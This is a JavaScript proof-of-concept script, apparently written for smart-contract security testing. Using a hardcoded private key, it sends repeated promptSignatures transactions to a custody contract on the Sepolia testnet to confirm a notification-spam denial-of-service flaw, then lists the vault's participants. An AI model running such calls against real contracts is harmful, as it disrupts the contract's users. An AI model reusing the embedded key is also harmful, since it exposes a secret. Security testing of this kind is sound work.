const { ethers } = require("ethers");

// === HUNT FOR MORE VULNERABILITIES (Using Existing Vault) ===

const RPC_URL = "https://ethereum-sepolia.publicnode.com";
const CUSTODY_ADDRESS = "0x815aeca64a974297942d2bbf034bd63eb638883d";
const PRIVATE_KEY = "0xa12f4dc456a8fa989f093604e702384f9691f99c3242f615fc9a1ba0d3b3eaf2";

// Reuse existing vault from earlier tests
const EXISTING_VAULT = "0x5465737431373636363632323539303235000000000000000000000000000000";

const ABI = [
    "function promptSignatures(bytes32 _creator) external",
    "function getParticipants(bytes32 _creator) external view returns (bytes32[])",
    "function getQuorum(bytes32 _creator) external view returns (uint256)",
    "function checkQuorum(bytes32 _creator, uint256 _txid) external view returns (bool)"
];

async function run() {
    console.log("=== MORE VULNERABILITY TESTS (No New Vaults) ===\n");

    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    const contract = new ethers.Contract(CUSTODY_ADDRESS, ABI, wallet);

    console.log(`Using Existing Vault: ${EXISTING_VAULT.substring(0, 20)}...\n`);

    // TEST: Can we call promptSignatures multiple times (spam)?
    console.log("TEST: Transaction Spam via promptSignatures");
    console.log("=".repeat(70));

    try {
        console.log("sending first signature prompt...");
        const tx1 = await contract.promptSignatures(EXISTING_VAULT, { gasLimit: 500000 });
        const r1 = await tx1.wait();
        console.log(`Transaction 1 confirmed: ${r1.transactionHash}`);

        console.log("Sending second signature prompt...");
        const tx2 = await contract.promptSignatures(EXISTING_VAULT, { gasLimit: 500000 });
        const r2 = await tx2.wait();
        console.log(`Transaction 2 confirmed: ${r2.transactionHash}`);

        console.log("\nEXPLOIT CONFIRMED: Spammed transaction prompts.");
        console.log("Impact: DoS via notification spam to participants.\n");

    } catch (e) {
        console.log(`Protected: ${e.reason || e.message}\n`);
    }

    // Check participants
    try {
        const participants = await contract.getParticipants(EXISTING_VAULT);
        console.log(`Vault has ${participants.length} participants`);
        if (participants.length > 0) {
            participants.forEach((p, i) => console.log(`  ${i + 1}. ${p}`));
        }
    } catch (e) {
        console.log("Could not fetch participants");
    }
}

run().catch(console.error);
